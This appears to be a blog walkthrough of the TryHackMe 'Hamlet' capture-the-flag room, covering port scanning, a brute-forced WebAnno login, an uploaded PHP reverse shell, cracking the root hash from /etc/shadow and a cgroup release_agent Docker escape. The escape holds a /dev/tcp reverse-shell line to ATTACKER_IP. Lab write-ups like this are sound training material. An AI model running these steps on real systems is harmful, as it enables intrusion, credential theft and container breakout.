---
layout: post
title: "TryHackMe Hamlet Walkthrough"
date: 2025-05-22 16:00:00 +0700
categories: [walkthrough, tryhackme]
tags: [ctf, hamlet, tryhackme, hacking, privilege-escalation]
image:
  path: /assets/img/posts/hamlet/preview.png
  alt: Hamlet Walkthrough Preview
toc: true
---

---

## 🧠 Room Overview

- **Name**: Hamlet  
- **Platform**: TryHackMe  
- **Difficulty**: Medium  
- **Objective**: Capture the flags and achieve root  
- **Time Taken**: 3–5 hours  
- **Notes**: Done multiple times; some screenshots use different IPs.

---

## 🔍 Initial Recon

Scan the machine:

```bash
nmap -sV -A -v 10.10.124.116
```

Open ports:
- 21 (FTP)
- 22 (SSH)
- 80 (lighttpd)
- 501 (Nagios-like)
- 8000 (Apache)
- 8080 (Tomcat / WebAnno)

---

## 📂 Port 21 - FTP

Anonymous login:

```bash
ftp 10.10.124.116
```

Files downloaded:
- `password-policy.md`
- `ufw.status`

![ftp-files](/assets/img/posts/hamlet/1.png)

---

## 🌐 Port 8080 - WebAnno Login

WebAnno login page was up.

Generated a custom wordlist from Hamlet text:

```bash
cewl -m 12 -w wordlist.txt --lowercase http://10.10.1.97/hamlet.txt
```

Used Burp Suite to brute-force login → `ghost` credentials found.

Logged in → Found users: `admin`, `ophelia`.

Reset `ophelia` password → logged in → found password hint in annotations.

![webanno-login](/assets/img/posts/hamlet/3.png)

---

## 🌐 Port 80 - lighttpd

Homepage titled “Hamlet Annotation Project”.

Gobuster scan:

```bash
gobuster dir -u http://10.10.1.97 -w /usr/share/wordlists/dirb/big.txt
```

Found `robots.txt` → Contains flag + Hamlet text URL.

Used text to generate password list.

---

## 🎭 Port 501 - Gravediggers

Connected via:

```bash
nc 10.10.1.97 501
```

Received Shakespearean riddle → Researched → Got second flag.

![gravedigger-riddle](/assets/img/posts/hamlet/24.png)

---

## 📄 Port 8000 - Apache (Hamlet)

Another copy of Hamlet hosted via iframe from WebAnno project.

Uploaded PHP reverse shell to WebAnno project.

![reverse-shell-upload](/assets/img/posts/hamlet/25.png)

Start listener:

```bash
nc -lvnp 1234
```

Triggered via:

```bash
curl http://10.10.1.97:8000/repository/project/0/document/1/source/reverse-shell.txt
```

![reverse-shell](/assets/img/posts/hamlet/28.webp)

---

## 🚩 Privilege Escalation

Stabilized shell:

```bash
script /dev/null -c bash
```

Read `/etc/passwd` and `/etc/shadow`.

Cracked root password using John:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt
```

Password: `murder`

Switched to root:

```bash
su
```

---

## 🐳 Docker Escape

Confirmed Docker with `hostname` and `cat /proc/1/cgroup`.

Attempted cgroup release_agent method:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
echo "#!/bin/bash" > /cmd
echo "bash -i >& /dev/tcp/ATTACKER_IP/1603 0>&1" >> /cmd
chmod +x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs
```

Got reverse shell from Docker host.

![docker-escape](/assets/img/posts/hamlet/26.png)

---

## 🏁 Final Flags

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

✅ All flags captured, including host root-level flag.

![final-flag](/assets/img/posts/hamlet/27.png)

---

### References

- [GitHub Walkthrough](https://github.com/IngoKl/THM-Hamlet)